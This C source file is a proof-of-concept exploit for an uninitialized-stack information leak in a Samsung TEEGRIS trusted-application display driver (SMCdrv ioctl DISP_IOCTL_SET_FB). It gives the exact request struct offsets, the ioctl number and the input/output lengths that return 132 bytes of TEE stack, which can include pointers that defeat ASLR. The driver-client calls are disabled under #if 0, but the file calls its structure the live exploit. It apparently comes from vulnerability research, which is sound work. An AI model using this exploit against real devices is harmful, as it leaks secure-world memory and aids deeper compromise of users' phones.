/*
 * smcdrv DISP_IOCTL_SET_FB (cmd 16) — uninitialized TEE-stack disclosure (MED)
 * ==========================================================================
 *
 *   Target TA : SMCdrv  ("tui_display" framebuffer-manager driver)
 *   UUID      : 00000000-0000-0000-0000-000000020081
 *   Handler   : tui_disp_drv_ioctl @ 0x9664   (file_ops .ioctl; the
 *               GP TA_InvokeCommandEntryPoint is a *stub* — return 0)
 *   ioctl     : cmd 16 = DISP_IOCTL_SET_FB
 *   Finding   : RE/samsung_teegris/smcdrv.md  finding #1 (lines 29-60)
 *               RE/emulation/smcdrv.md         (lines 9-19, 82-114)
 *
 * ── WHY THIS FILE IS DOCUMENTATION-GRADE, NOT A RUNNABLE TEEC CLIENT ──────
 *
 * Unlike the other POCs in this tree (teessu_cleardata, gatekeeper_throttle),
 * this is NOT a REE-side GlobalPlatform TEEC client. The attack surface is a
 * *TEE-internal* TEEGRIS driver ioctl. SMCdrv registers itself with
 *
 *     TEES_InitDriver("tui_display", &file_ops, 5, ...);   // smcdrv.md:85
 *
 * and exposes the bug on the file_ops .ioctl path — a channel reached only by
 * ANOTHER TA that opens the driver fd via the TEEGRIS driver-CLIENT API
 * (drv_open_client + ioctl), NOT by a standalone REE process and NOT through
 * the GP TA_InvokeCommand path. So:
 *
 *   1. The GP-TEEC emulator in this repo speaks TA_InvokeCommand only; it does
 *      not model the TEEGRIS driver-client ioctl transport.  (smcdrv.md
 *      emulation: lines 96-101)
 *   2. SMCdrv additionally BOOT-DIES in the emulator at TA_CreateEntryPoint on
 *      the un-modeled TEES_RegisterDriverDestructor, so it never even reaches a
 *      command.  (RE/emulation/smcdrv.md lines 59-94)
 *   3. The leak is a *write-direction / read-too-much* disclosure with no
 *      corruption, so asan (heap redzones only) raises no signal even on a
 *      reachable happy path.  (RE/emulation/smcdrv.md lines 100-114)
 *
 * Therefore this file does **not compile/run against the TEEC emulator**. It is
 * a byte-precise transcription of the request a calling TUI TA (e.g. MPSTUI,
 * UUID ...0053545354ab "STST", or KEYMST ...4b45594d5354) would build — the
 * struct layout and the ioctl number are exact, every constant cites the
 * writeup line and is corroborated against the decompiled handler. It is kept
 * syntactically clean C (references TEEGRIS driver-client headers that are NOT
 * present on this host, so it is meant to be READ, not built).
 *
 * ── THE BUG, IN ONE PARAGRAPH ─────────────────────────────────────────────
 *
 * The 176-byte fbset_cmd struct `dest` lives at SP+0x08 and is NEVER memset.
 * Input and output iov_len are validated by TWO INDEPENDENT guards, each only
 * "< 0xB1" (<= 176), with NO cross-check that output.iov_len <= input.iov_len:
 *
 *     input  guard @ 0x96d0 :  CMP X4,#0xB1 / B.CC   (smcdrv.md:36-37)
 *         memcpy(&dest, input.buf, input.iov_len)        @ 0x97c8
 *     output guard @ 0x9918 :  CMP X4,#0xB1 / B.CC   (smcdrv.md:38-40)
 *         memcpy(output.buf, &dest, output.iov_len)      @ 0x9990
 *
 * (Confirmed in the decompiled handler: input len read from params+8 and
 *  checked `< 0xB1u`; output len read from params+264 and checked `>= 0xB1u`
 *  -> error; otherwise `memcpy(out_buf, &dest, output.iov_len)`.)
 *
 * A caller sets input.iov_len = 44 (just enough to populate the validated
 * fields, with wb=0 so the else-branch zeroes only dest+0x30 and validation
 * passes with fb!=0 and a matching fb_size_aligned) and output.iov_len = 176.
 * The unconditional copy-back then returns bytes [44..175] of `dest` —
 * ~132 bytes of uninitialized TEE stack below the canary (residue of prior
 * sub_AF0C / memcpy / printf frames, which can include TEE pointers ->
 * defeats userspace ASLR). The copy-back runs UNCONDITIONALLY after
 * tuiHalDisplayProtectFramebuffer (sub_AA40), so it does not even require a
 * valid framebuffer.  (smcdrv.md:42-51)
 *
 * ── fbset_cmd FIELD LAYOUT (decompiler-exact; base = &dest) ───────────────
 *
 *   The decompiled cmd-16 handler reads the validated fields as:
 *       height          = *(u32*)(dest + 0x08)   // ctx ; CMP >0x1000 reject
 *       width           = *(u32*)(dest + 0x0C)   // CMP >0x1000 reject
 *       fb              = *(u32*)(dest + 0x10)    // src ; must be != 0
 *       fb_size_aligned = *(u32*)(dest + 0x18)    // must == (4*w*h+0xFFF)&~0xFFF
 *       wb              = *(u32*)(dest + 0x28)    // if !=0 -> extra WB checks;
 *                                                 //  ==0 -> else: dest+0x30=0
 *       wb_size         = *(u32*)(dest + 0x30)    // v28
 *   The canary (qword_1B000) sits ABOVE the struct (xbp-8) and is not in dest.
 *   The minimal populate length 44 (0x2C) covers offsets [0x00..0x2B], i.e.
 *   through the 4-byte `wb` field at 0x28 — exactly the validated set, which
 *   is why input.iov_len = 44 is the chosen value (smcdrv.md:42-44).
 *   Bytes [0x2C..0xAF] are the never-written tail that leaks back.
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>

/*
 * NOTE: the following are TEEGRIS driver-client / GP-internal symbols. They are
 * NOT available on this analysis host (no TEEGRIS SDK headers), which is the
 * intended state — this translation unit documents the request, it does not
 * link. The signatures mirror the SDK's drv_open_client/ioctl pattern observed
 * in sibling TUI-subsystem TAs (MPSTUI/STST uses drv_open_client + ioctl for
 * /dev/iccc_driver; the same API opens "tui_display").
 */
#if 0   /* <- documentation-only: do not build (headers absent on host) */
extern int  drv_open_client(const char *driver_name, int flags);
extern int  ioctl(int fd, unsigned long request, void *arg);
extern void DumpHex(const void *data, size_t size, void *display_addr);
#endif

/* ─────────────────────────────────────────────────────────────────────────
 * The DISP_IOCTL_SET_FB command id.
 *   smcdrv.md:30,101 — "cmd 16  DISP_IOCTL_SET_FB"
 *   re_teegris_smcdrv.py — enum tui_disp_cmd { DISP_IOCTL_SET_FB = 16, ... }
 * ───────────────────────────────────────────────────────────────────────── */
#define DISP_IOCTL_SET_FB     16

/* sizeof(fbset_cmd). smcdrv.md:30,114 — "176 = sizeof(fbset_cmd)";
 * both guards are the unsigned compare `< 0xB1` (= accept <= 176). */
#define SIZEOF_FBSET_CMD      176          /* 0xB0 */

/* The two attacker-chosen lengths (smcdrv.md:42-51). */
#define INPUT_IOV_LEN         44           /* 0x2C: populates validated fields */
#define OUTPUT_IOV_LEN        176          /* 0xB0: max accepted by output guard */

/* The leaked window: bytes [INPUT_IOV_LEN .. SIZEOF_FBSET_CMD-1]. */
#define LEAK_OFF              INPUT_IOV_LEN                       /* 0x2C  = 44  */
#define LEAK_LEN             (SIZEOF_FBSET_CMD - INPUT_IOV_LEN)   /* 0x84  = 132 */

/*
 * fbset_cmd — the 176-byte request/response struct, base = &dest.
 * Offsets are decompiler-exact (see header block). Only the fields the cmd-16
 * validator reads are named; the rest is padding that the copy-back leaks.
 *
 * Same struct is used for BOTH the input iov (caller -> dest, validated) AND
 * the output iov (dest -> caller, the copy-back). That symmetry is the whole
 * bug: the validator initializes only the input prefix, the copy-back returns
 * the full output length.
 */
typedef struct {
    uint8_t   _pad00[0x08];   /* 0x00: header/reserved (part of `dest` q-word) */
    uint32_t  height;         /* 0x08: validated CMP > 0x1000 -> reject        */
    uint32_t  width;          /* 0x0C: validated CMP > 0x1000 -> reject        */
    uint32_t  fb;             /* 0x10: src; must be != 0 (null-FB check)       */
    uint8_t   _pad14[0x04];   /* 0x14: gap to fb_size_aligned                  */
    uint32_t  fb_size_aligned;/* 0x18: must == (4*w*h + 0xFFF) & ~0xFFF        */
    uint8_t   _pad1c[0x0C];   /* 0x1C: gap to wb                               */
    uint32_t  wb;             /* 0x28: writeback addr; 0 -> else-branch        */
    uint8_t   _pad2c[0x04];   /* 0x2C: (first byte of the leaked tail)         */
    uint32_t  wb_size;        /* 0x30: v28; zeroed by else-branch when wb==0   */
    uint8_t   _tail[SIZEOF_FBSET_CMD - 0x34]; /* 0x34..0xAF: never written     */
} fbset_cmd;

/* compile-time sanity: the named offsets must match the decompiler. */
_Static_assert(sizeof(fbset_cmd) == SIZEOF_FBSET_CMD, "fbset_cmd must be 176 B");
_Static_assert(__builtin_offsetof(fbset_cmd, height)          == 0x08, "height@0x08");
_Static_assert(__builtin_offsetof(fbset_cmd, width)           == 0x0C, "width@0x0C");
_Static_assert(__builtin_offsetof(fbset_cmd, fb)              == 0x10, "fb@0x10");
_Static_assert(__builtin_offsetof(fbset_cmd, fb_size_aligned) == 0x18, "fb_sz@0x18");
_Static_assert(__builtin_offsetof(fbset_cmd, wb)              == 0x28, "wb@0x28");
_Static_assert(__builtin_offsetof(fbset_cmd, wb_size)         == 0x30, "wb_sz@0x30");

/*
 * The TEEGRIS ioctl argument block (`params`, a3 of tui_disp_drv_ioctl).
 * Decompiler-exact offsets:
 *     input  iov: buf @ params+0x000,  len @ params+0x008   (`params+8`)
 *     output iov: buf @ params+0x100,  len @ params+0x108   (`params+264`)
 * i.e. two GP-style iovecs 256 bytes apart. We model the two we drive.
 */
typedef struct { void *buf; uint64_t iov_len; } disp_iov;   /* {ptr,len}      */

typedef struct {
    disp_iov  in;                 /* 0x000 : input iov  (params+0 / params+8)  */
    uint8_t   _gap[0x100 - sizeof(disp_iov)];
    disp_iov  out;                /* 0x100 : output iov (params+256 / +264)    */
} disp_ioctl_args;

_Static_assert(__builtin_offsetof(disp_ioctl_args, in)  == 0x000, "in iov@0");
_Static_assert(__builtin_offsetof(disp_ioctl_args, out) == 0x100, "out iov@0x100");
/* len fields land at +0x08 and +0x108 exactly, matching params+8 / params+264. */


/*
 * build_set_fb_request() — assemble the exact DISP_IOCTL_SET_FB request that a
 * calling TUI TA would issue to trigger the disclosure.
 *
 * Geometry is chosen to PASS validation with the minimal initialized prefix:
 *   - width  = 4, height = 1   (both <= 0x1000)                  smcdrv.md:116
 *   - fb_size_aligned = (4*4*1 + 0xFFF) & ~0xFFF = 0x1000         smcdrv.md:118-122
 *   - fb     = 0x80000000 (any non-zero phys addr passes !src)   smcdrv.md:121
 *   - wb     = 0  -> WB checks skipped, else-branch zeroes 0x30   smcdrv.md:124,44
 * The input length is 44 so ONLY [0x00..0x2B] is written; the output length is
 * 176 so the copy-back returns the full struct, exposing [44..175].
 */
static void build_set_fb_request(fbset_cmd *req)
{
    memset(req, 0, sizeof(*req));      /* caller-side buffer; harmless. The bug
                                          is that the *TEE-side* `dest` is the
                                          one never zeroed. */
    req->height          = 1;          /* <= 0x1000  */
    req->width           = 4;          /* <= 0x1000  */
    req->fb              = 0x80000000; /* != 0 -> passes the null-FB check */
    req->fb_size_aligned = ((4u * req->width * req->height) + 0xFFF) & 0xFFFFF000u; /* 0x1000 */
    req->wb              = 0;          /* 0 -> else-branch, no WB constraints */
    req->wb_size         = 0;
}

/*
 * poc_smcdrv_fb_leak() — the body a TUI client TA (MPSTUI/STST or KEYMST) runs.
 * Documentation-grade: the driver-client calls are #if-0'd out because the SDK
 * is absent on this host. The STRUCTURE is the live exploit.
 */
int poc_smcdrv_fb_leak(void)
{
    fbset_cmd        req;     /* input  iov payload (44 bytes consumed)        */
    uint8_t          resp[SIZEOF_FBSET_CMD]; /* output iov: receives 176 bytes */
    disp_ioctl_args  args;

    build_set_fb_request(&req);

    /* Pre-stain the response buffer so the leak is visually obvious: any byte
     * that comes back != 0xCC is uninitialized TEE-stack residue copied into
     * [44..175]. (Bytes [0..43] are the echo of our own validated prefix.) */
    memset(resp, 0xCC, sizeof(resp));

    memset(&args, 0, sizeof(args));
    args.in.buf      = &req;
    args.in.iov_len  = INPUT_IOV_LEN;     /* 44  — only the validated prefix   */
    args.out.buf     = resp;
    args.out.iov_len = OUTPUT_IOV_LEN;    /* 176 — pull back the whole struct  */

#if 0  /* ── live path (TEEGRIS driver-client; not built on this host) ────── */
    /* 1. open the SMCdrv "tui_display" driver fd. No UUID allowlist — the only
     *    gate is SMCdrv's open-state check dword_1C01C==1, satisfied by the
     *    driver's own .open. Any TA with driver-client access reaches it.
     *    (smcdrv.md:106-107, 189-190) */
    int fd = drv_open_client("tui_display", 0);
    if (fd < 0) {
        printf("[-] drv_open_client(\"tui_display\") failed\n");
        return -1;
    }

    /* 2. issue DISP_IOCTL_SET_FB (cmd 16) with the asymmetric iov lengths. */
    int rc = ioctl(fd, DISP_IOCTL_SET_FB, &args);
    printf("[*] DISP_IOCTL_SET_FB -> %d\n", rc);   /* 0 / -1 / -101: leak still
                                                       happened, copy-back is
                                                       unconditional */

    /* 3. reveal it: resp[44..175] are uninitialized TEE stack bytes. */
    DumpHex(resp, sizeof(resp), resp);
    printf("[*] leaked %d B of uninitialized TEE stack at resp[%d..%d]\n",
           LEAK_LEN, LEAK_OFF, SIZEOF_FBSET_CMD - 1);
#else
    /* ── documentation build: just describe what the live path would do ──── */
    (void)args;
    printf("[doc] smcdrv DISP_IOCTL_SET_FB (cmd %d) uninitialized-stack leak\n",
           DISP_IOCTL_SET_FB);
    printf("[doc] input.iov_len=%d  output.iov_len=%d  -> copy-back returns "
           "resp[%d..%d] = %d B of uninitialized TEE stack\n",
           INPUT_IOV_LEN, OUTPUT_IOV_LEN, LEAK_OFF, SIZEOF_FBSET_CMD - 1, LEAK_LEN);
    printf("[doc] would: drv_open_client(\"tui_display\") -> "
           "ioctl(fd, %d, &args) -> DumpHex(resp,176)\n", DISP_IOCTL_SET_FB);
    printf("[doc] reachable from TUI TAs holding a tui_display fd: "
           "MPSTUI/STST (...0053545354ab), KEYMST (...4b45594d5354)\n");
#endif
    return 0;
}

/*
 * main(): in the documentation build, just print the description. The actual
 * exploit runs INSIDE a TUI TA (poc_smcdrv_fb_leak above), not as a REE binary.
 */
int main(void)
{
    return poc_smcdrv_fb_leak();
}
